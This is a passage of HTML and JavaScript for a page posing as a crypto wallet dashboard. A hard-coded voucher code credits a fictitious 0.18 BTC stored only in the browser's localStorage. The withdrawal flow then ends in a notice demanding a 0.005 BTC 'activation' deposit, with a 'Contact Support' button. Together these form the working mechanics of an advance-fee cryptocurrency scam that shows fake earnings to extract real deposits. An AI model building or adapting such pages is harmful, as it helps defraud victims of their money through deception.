                                    <img width="48" height="48"
                                        src="https://img.icons8.com/fluency/48/cardano.png" alt="cardano" />
                                    <span class="asset-name">Cardano (ADA)</span>
                                </div>
                                <span class="asset-balance">$0.00</span>
                                <div class="buttons">
                                    <button class="button">Deposit</button>
                                    <button class="button">Withdraw</button>
                                    <button class="button">Transfer</button>
                                </div>
                            </li>
                            <!-- Repeat the following list item structure for other assets -->
                            <!-- Make sure to include media queries within <style> tags -->
                        </ul>
                    </div>
                    <div class="col-sm-3">
                        <div class="well">
                            <h4>Pages</h4>
                            <p>100 Million</p>
                        </div>
                    </div>
                    <div class="col-sm-3">
                        <div class="well">
                            <h4>Sessions</h4>
                            <p>10 Million</p>
                        </div>
                    </div>
                    <div class="col-sm-3">
                        <div class="well">
                            <h4>Bounce</h4>
                            <p>30%</p>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-4">
                        <div class="well">
                            <p>Text</p>
                            <p>Text</p>
                            <p>Text</p>
                        </div>
                    </div>
                    <div class="col-sm-4">
                        <div class="well">
                            <p>Text</p>
                            <p>Text</p>
                            <p>Text</p>
                        </div>
                    </div>
                    <div class="col-sm-4">
                        <div class="well">
                            <p>Text</p>
                            <p>Text</p>
                            <p>Text</p>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-8">
                        <div class="well">
                            <p>Text</p>
                        </div>
                    </div>
                    <div class="col-sm-4">
                        <div class="well">
                            <p>Text</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Transaction History -->
    <div id="transactionHistory">
        <span id="closeTransactionHistory" class="close">&times;</span>
        <h2>Transaction History</h2>
        <ul id="transactionList"></ul>
    </div>
    <!--TOGGLE-->
    <!-- Link to trigger the pop-up -->

    <!-- Link to trigger the pop-up -->




    <!-- Pop-up container -->
    <div class="overlay" id="overlay"></div>
    <div id="popup" class="popup">
        <span id="closePopup" class="close">&times;</span>
        <h2>VOUCHER</h2>
        <P> increase your earning </P>
        <input type="text" id="textInput" placeholder="Enter Voucher code">
        <button id="logButton">Activate</button>
    </div>

    <!-- Congratulations Pop-up -->
    <div class="overlay" id="congratsOverlay"></div>
    <div id="congratsPopup" class="popup">
        <span id="closeCongrats" class="close">&times;</span>
        <h2 style="color: green; font-weight: bolder; text-decoration: solid;">Congratulations!</h2>
        <h3>0.18 BTC Recieved </h3>
        <img src="images/box2 (1).png" alt="Girl in a jacket" width="200" height="1200">
        <button id="acceptBTC">Accept BTC</button>
    </div>

    <script>
        // Check if BTC balance is stored in localStorage
        var btcBalance = localStorage.getItem('btcBalance');
        if (btcBalance === null) {
            btcBalance = 0; // Set initial BTC balance if not found in localStorage
        } else {
            btcBalance = parseFloat(btcBalance); // Parse stored value to float
        }
        document.getElementById('btcBalanceValue').innerText = btcBalance.toFixed(2); // Update displayed balance
        //second bal

        // Check if BTC balance is stored in localStorage
        var btcBalance = localStorage.getItem('btcBalance');
        if (btcBalance === null) {
            btcBalance = 0; // Set initial BTC balance if not found in localStorage
        } else {
            btcBalance = parseFloat(btcBalance); // Parse stored value to float
        }
        document.getElementById('btcBalanceValue2').innerText = btcBalance.toFixed(2); // Update displayed balance

        // Function to toggle the pop-up
        function togglePopup(popupId, overlayId) {
            var popup = document.getElementById(popupId);
            var overlay = document.getElementById(overlayId);
            popup.style.display = popup.style.display === "block" ? "none" : "block";
            overlay.style.display = overlay.style.display === "block" ? "none" : "block";
        }

        // Event listener for Voucher link click - First instance
        document.getElementById("popupToggle1").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default behavior of link
            togglePopup("popup", "overlay"); // Toggle the pop-up
        });

        // Event listener for Voucher link click - Second instance
        document.getElementById("popupToggle2").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default behavior of link
            togglePopup("popup", "overlay"); // Toggle the pop-up
        });

        // Event listener for close button click
        document.getElementById("closePopup").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default behavior of button
            togglePopup("popup", "overlay"); // Toggle the pop-up
        });

        // Event listener for log button click
        document.getElementById("logButton").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default behavior of button
            var inputValue = document.getElementById("textInput").value;
            if (inputValue === "GDHY678") { // Check if code is valid
                togglePopup("popup", "overlay"); // Close the first pop-up
                togglePopup("congratsPopup", "congratsOverlay"); // Open the second pop-up
            } else {
                alert("you have inputed an Invalid voucher code.");
            }
        });

        // Event listener for close button click in Congratulations Pop-up
        document.getElementById("closeCongrats").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default behavior of button
            togglePopup("congratsPopup", "congratsOverlay"); // Toggle the pop-up
        });

        // Event listener for accept BTC button click
        document.getElementById("acceptBTC").addEventListener("click", function(event) {
            event.preventDefault(); // Prevent default behavior of button
            btcBalance += 0.18; // Update BTC balance by adding 0.18
            document.getElementById("btcBalanceValue").innerText = btcBalance.toFixed(
                2); // Update displayed balance
            localStorage.setItem('btcBalance', btcBalance.toFixed(2)); // Store updated BTC balance in localStorage
            togglePopup("congratsPopup", "congratsOverlay"); // Close the second pop-up
        });
    </script>








    <!--toggle for withdrawal-->

    <a href="#" id="withdrawButton"><button class="button4"><span>Withdraw</span></button></a>

    <div class="popup" id="withdrawPopup">
        <div class="popup-content">
            <span class="close" onclick="hidePopup()">&times;</span>
            <img src="images/bit.png" alt="Image"
                style="display:block; margin: 0 auto; width: 170px; height: auto;">
            <select id="withdrawSelect" onchange="showAdditionalOptions(this.value)">
                <option value="">Select a Coin</option>
                <option value="BTC">Bitcoin (BTC)</option>
                <!-- Add more options as needed -->
            </select>
            <div id="additionalOptions" style="display: none;">
                <select id="additionalSelect">
                    <option value="">Select a Network</option>
                    <option value="BTC">BTC</option>
                    <!-- Add more options as needed -->
                </select>
                <br><br>
                <button id="submitWithdraw">Submit</button>
            </div>
        </div>
    </div>

    <div class="popup" id="additionalPopup">
        <div class="popup-content">
            <span class="close" onclick="hideAdditionalPopup()">&times;</span>
            <img src="images/bitcon.png" alt="Image"
                style="display:block; margin: 0 auto; width: 170px; height: auto;">
            <form id="additionalForm">
                <input type="text" id="inputField1" placeholder="BTC Wallet Address">
                <br>
                <input type="text" id="inputField2" placeholder="Enter Amount To Withdraw">
                <p>Do not send BTC unless you are certain the destination supports BTC transactions.</p>
                <button type="submit" id="submitAdditional">Submit</button>
            </form>

        </div>
    </div>



    <div class="popup" id="finalPopup">
        <div class="popup-content">
            <span class="close" onclick="hideLastPopup()">&times;</span>
            <img src="images/cancel.png" alt="Image"
                style="display:block; margin: 0 auto; width: 170px; height: auto;">
            <p style="color: red;font-weight: bolder;">To withdraw funds to a third-party address, you need to activate
                your account. To activate the account, make a minimum deposit of 0.005 BTC. The deposit can also be
                withdrawn after account activation.</p>
            <p><b><i>Your deposit: 0 / 0.005 BTC.</i></b></p>
            <a href=""> <button id="lastButton">Contact Support</button></a>
        </div>
    </div>

    <script>
        function hidePopup() {
            document.getElementById('withdrawPopup').style.display = 'none';
        }

        function hideAdditionalPopup() {
            document.getElementById('additionalPopup').style.display = 'none';
        }

        function hideFinalPopup() {
            document.getElementById('finalPopup').style.display = 'none';
        }

        function hideLastPopup() {
            document.getElementById('lastPopup').style.display = 'none';
        }

        function openAdditionalPopup() {
            document.getElementById('additionalPopup').style.display = 'block';
            document.getElementById('withdrawPopup').style.display = 'none'; // Hide the first popup
        }

        function openFinalPopup() {
            document.getElementById('finalPopup').style.display = 'block';
            document.getElementById('additionalPopup').style.display = 'none'; // Hide the second popup
        }

        function openLastPopup() {
            document.getElementById('lastPopup').style.display = 'block';
            document.getElementById('finalPopup').style.display = 'none'; // Hide the third popup
        }

        function showAdditionalOptions(selectedValue) {
            if (selectedValue === "BTC") {
                document.getElementById('additionalOptions').style.display = 'block';
            } else {
                document.getElementById('additionalOptions').style.display = 'none';
            }
        }

        document.getElementById('withdrawButton').addEventListener('click', function() {
            document.getElementById('withdrawPopup').style.display = 'block';
        });

        document.getElementById('submitWithdraw').addEventListener('click', function() {
            openAdditionalPopup();
        });

        document.getElementById('submitAdditional').addEventListener('click', function() {
            openFinalPopup();
        });

        document.getElementById('submitFinal').addEventListener('click', function() {
            openLastPopup();
        });
    </script>






</body>

</html>
